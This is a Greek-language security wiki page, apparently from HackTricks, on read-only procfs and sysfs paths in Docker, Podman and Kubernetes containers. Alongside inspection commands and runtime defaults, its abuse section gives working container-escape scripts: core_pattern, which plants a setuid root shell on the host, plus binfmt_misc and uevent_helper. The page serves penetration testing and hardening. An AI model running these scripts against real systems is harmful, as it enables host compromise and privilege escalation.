# Διαδρομές Συστήματος μόνο για ανάγνωση

{{#include ../../../../banners/hacktricks-training.md}}

Οι διαδρομές συστήματος μόνο για ανάγνωση αποτελούν ξεχωριστό μηχανισμό προστασίας σε σχέση με τις masked paths. Αντί να αποκρύπτει εντελώς μια διαδρομή, το runtime την εκθέτει αλλά την προσάρτησε ως μόνο για ανάγνωση. Αυτό είναι συνηθισμένο για επιλεγμένες θέσεις procfs και sysfs όπου η πρόσβαση για ανάγνωση μπορεί να είναι αποδεκτή ή απαραίτητη για τη λειτουργία, αλλά οι εγγραφές θα ήταν πολύ επικίνδυνες.

Ο σκοπός είναι απλός: πολλές διεπαφές του πυρήνα γίνονται πολύ πιο επικίνδυνες όταν είναι εγγράψιμες. Ένα mount μόνο για ανάγνωση δεν αφαιρεί όλη την reconnaissance αξία, αλλά εμποδίζει ένα παραβιασμένο workload από το να τροποποιήσει τα υποκείμενα αρχεία που κοιτάνε προς τον πυρήνα μέσω αυτής της διαδρομής.

## Λειτουργία

Τα runtimes συχνά επισημαίνουν μέρη της προβολής proc/sys ως μόνο για ανάγνωση. Ανάλογα με το runtime και τον host, αυτό μπορεί να περιλαμβάνει διαδρομές όπως:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Η πραγματική λίστα ποικίλλει, αλλά το μοντέλο είναι το ίδιο: επιτρέπεται η ορατότητα όπου χρειάζεται, ενώ η τροποποίηση απαγορεύεται από προεπιλογή.

## Εργαστήριο

Ελέγξτε τη λίστα διαδρομών μόνο για ανάγνωση που δηλώνεται από το Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Επιθεωρήστε την προσαρτημένη προβολή proc/sys από μέσα στο container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Επιπτώσεις στην Ασφάλεια

Οι διαδρομές συστήματος μόνο για ανάγνωση περιορίζουν μια μεγάλη κατηγορία κατάχρησης που επηρεάζει τον host. Ακόμα και όταν ένας επιτιθέμενος μπορεί να εξετάσει το procfs ή το sysfs, η αδυναμία εγγραφής εκεί αφαιρεί πολλούς άμεσους τρόπους τροποποίησης που περιλαμβάνουν παράμετρους του kernel, crash handlers, βοηθητικά φόρτωσης modules ή άλλες διεπαφές ελέγχου. Η έκθεση δεν εξαφανίζεται, αλλά η μετάβαση από την αποκάλυψη πληροφοριών στην επιρροή του host γίνεται πιο δύσκολη.

## Λανθασμένες ρυθμίσεις

Τα κύρια λάθη είναι το unmasking ή το remounting ευαίσθητων διαδρομών ως read-write, η άμεση έκθεση του host proc/sys περιεχομένου μέσω εγγράψιμων bind mounts, ή η χρήση privileged modes που ουσιαστικά παρακάμπτουν τα ασφαλέστερα runtime defaults. Στο Kubernetes, `procMount: Unmasked` και privileged workloads συχνά εμφανίζονται μαζί με ασθενέστερη προστασία του proc. Ένα άλλο κοινό επιχειρησιακό λάθος είναι η υπόθεση ότι επειδή το runtime συνήθως προσαρτά αυτές τις διαδρομές ως μόνο-ανάγνωσης, όλα τα workloads εξακολουθούν να κληρονομούν αυτή την προεπιλογή.

## Κατάχρηση

Εάν η προστασία είναι αδύναμη, ξεκινήστε εξετάζοντας για εγγράψιμες εγγραφές proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Όταν υπάρχουν εγγράψιμες εγγραφές, οι διαδρομές υψηλής αξίας για επακόλουθη έρευνα περιλαμβάνουν:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Οι εγγραφές με δυνατότητα εγγραφής κάτω από `/proc/sys` συχνά σημαίνουν ότι το container μπορεί να τροποποιήσει τη συμπεριφορά του host kernel αντί απλώς να την εξετάσει.
- `core_pattern` είναι ιδιαίτερα σημαντικό επειδή μια writable host-facing τιμή μπορεί να μετατραπεί σε host code-execution path με το να προκαλέσεις crash σε μια διεργασία αφού ρυθμίσεις έναν pipe handler.
- `modprobe` αποκαλύπτει το helper που χρησιμοποιεί ο kernel για flows σχετιζόμενα με το module-loading· είναι ένας κλασικός high-value στόχος όταν είναι writable.
- `binfmt_misc` δείχνει αν είναι δυνατή η εγγραφή custom interpreter registration. Εάν η registration είναι writable, αυτό μπορεί να γίνει execution primitive αντί απλώς ενός information leak.
- `panic_on_oom` ελέγχει μια host-wide kernel απόφαση και μπορεί έτσι να μετατρέψει εξάντληση πόρων σε host denial of service.
- `uevent_helper` είναι ένα από τα πιο ξεκάθαρα παραδείγματα ενός writable sysfs helper path που παράγει host-context execution.

Ενδιαφέροντα ευρήματα περιλαμβάνουν writable host-facing proc knobs ή sysfs entries που κανονικά θα έπρεπε να είναι read-only. Εκείνη τη στιγμή, το workload έχει μετακινηθεί από μια περιορισμένη container view προς ουσιαστική επιρροή στον kernel.

### Πλήρες Παράδειγμα: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Αν η διαδρομή πράγματι φτάνει στον kernel του host, το payload εκτελείται στον host και αφήνει πίσω ένα setuid shell.

### Πλήρες Παράδειγμα: `binfmt_misc` Εγγραφή

Εάν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο, μια προσαρμοσμένη εγγραφή ερμηνευτή μπορεί να προκαλέσει εκτέλεση κώδικα όταν το αντίστοιχο αρχείο εκτελεστεί:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Σε ένα host-facing writable `binfmt_misc`, το αποτέλεσμα είναι εκτέλεση κώδικα στη διαδρομή του interpreter που ενεργοποιείται από τον kernel.

### Πλήρες Παράδειγμα: `uevent_helper`

Εάν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να καλέσει έναν host-path helper όταν ενεργοποιηθεί ένα αντίστοιχο event:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Ο λόγος που αυτό είναι τόσο επικίνδυνο είναι ότι το helper path επιλύεται από την προοπτική του host filesystem και όχι από ένα ασφαλές container-only context.

## Έλεγχοι

Αυτοί οι έλεγχοι καθορίζουν εάν η έκθεση των procfs/sysfs είναι read-only όπου αναμένεται και εάν το workload μπορεί ακόμη να τροποποιήσει ευαίσθητες kernel διεπαφές.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Τι είναι ενδιαφέρον εδώ:

- Μια κανονική ενισχυμένη (hardened) workload θα πρέπει να εκθέτει πολύ λίγα εγγράψιμα /proc/sys entries.
- Τα εγγράψιμα `/proc/sys` μονοπάτια είναι συχνά πιο σημαντικά από την απλή πρόσβαση μόνο-ανάγνωσης.
- Αν το runtime αναφέρει ότι ένα μονοπάτι είναι μόνο-ανάγνωσης αλλά στην πράξη είναι εγγράψιμο, ελέγξτε προσεκτικά mount propagation, bind mounts και τις ρυθμίσεις προνομίων.

## Προεπιλογές χρόνου εκτέλεσης

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη εξασθένιση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Ο Docker ορίζει μια προεπιλεγμένη λίστα read-only μονοπατιών για ευαίσθητα /proc entries | εκθέτοντας host /proc/sys mounts, `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | Ο Podman εφαρμόζει προεπιλεγμένα read-only μονοπάτια εκτός αν ρητά χαλαρώσουν | `--security-opt unmask=ALL`, ευρείες host mounts, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime | Χρησιμοποιεί το υποκείμενο μοντέλο read-only μονοπατιών του runtime εκτός αν αποδυναμωθεί από ρυθμίσεις του Pod ή host mounts | `procMount: Unmasked`, workloads με προνόμια, εγγράψιμα host /proc/sys mounts |
| containerd / CRI-O under Kubernetes | Προεπιλογή runtime | Συνήθως στηρίζεται στις προεπιλογές OCI/runtime | ίδιο με τη γραμμή Kubernetes; άμεσες αλλαγές στο runtime config μπορούν να αποδυναμώσουν τη συμπεριφορά |

Το κεντρικό σημείο είναι ότι τα read-only system paths συνήθως υπάρχουν ως προεπιλογή του runtime, αλλά είναι εύκολο να υπονομευτούν με privileged modes ή host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
